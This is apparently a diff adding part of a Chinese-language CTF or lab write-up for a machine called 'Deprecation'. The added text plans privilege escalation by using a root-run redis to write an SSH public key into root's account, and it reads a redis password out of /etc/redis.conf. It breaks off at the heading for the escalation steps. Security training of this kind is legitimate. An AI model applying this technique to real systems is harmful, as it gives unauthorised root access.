@@ -53,3 +53,40 @@ User shanran may run the following commands on Deprecation:
     (ALL) NOPASSWD: /sbin/rc-service redis start
     (ALL) NOPASSWD: /sbin/rc-service redis status
 ```
+redis运行用户为root
+利用redis的写文件进行提权，ssh公钥写进root
+```
+Deprecation:~$ ps aus | grep redis 
+3378 root 0:26 /usr/bin/redis-server 127.0.0.1:6379 3573 shanran 0:00 grep redis 
+Deprecation:~$ ls -ld /var/lib/redis 
+drwxr-xr-x 2 redis redis 4096 Mar 3 12:46 /var/lib/redis 
+Deprecation:~$ redis-cli CONFIG GET dir 
+(error) NOAUTH Authentication required.
+```
+查看redis.conf，发现密码mypassword123
+```
+Deprecation:~$ cat /etc/redis.conf
+bind 127.0.0.1
+port 6379
+protected-mode no
+tcp-backlog 511
+timeout 0
+tcp-keepalive 300
+
+daemonize yes
+supervised no
+pidfile /run/redis/redis.pid
+loglevel notice
+logfile /var/log/redis/redis.log
+
+requirepass mypassword123
+rename-command FLUSHALL ""
+
+dir /var/lib/redis
+dbfilename dump.rdb
+save 900 1
+save 300 10
+save 60 10000
+```
+
+提权流程
